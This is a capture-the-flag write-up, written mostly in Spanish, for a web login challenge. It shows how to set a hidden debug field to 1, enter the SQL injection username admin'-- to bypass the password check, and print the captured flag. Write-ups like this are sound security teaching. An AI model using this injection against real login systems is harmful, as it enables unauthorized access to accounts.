## Descripción
Do you think you can log us in? Try to see if you can login!

[http://fickle-tempest.picoctf.net:49222](http://fickle-tempest.picoctf.net:49222/).

1.- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

2.- Try to think about how the website verifies your login.
## Solución
```
Entramos a la página y abrimos el formulario de login desde `Admin Login`.
Después inspeccionamos el código del formulario y encontramos el siguiente campo oculto:
<inpt type="hidden" name="debug" value="0">

Modificamos el valor de `debug` de `0` a `1` desde el inspector del navegador:

<inpt type="hidden" name="debug" value="1">

Luego colocamos el siguiente usuario:

admin'--

Y en la contraseña podemos escribir cualquier cosa:

a

Al iniciar sesión, la página muestra la consulta SQL:

sql
SELECT * FROM users WHERE name='admin'--' AND password='a'

El `--` comenta la parte de la contraseña, por lo que la consulta valida solamente al usuario `admin`.

Resultado:
Logged in!
Your flag is: academy{s0m3_SQL_271c9a2b}
```
```

```

## Notas Adicionales

## Referencias
-
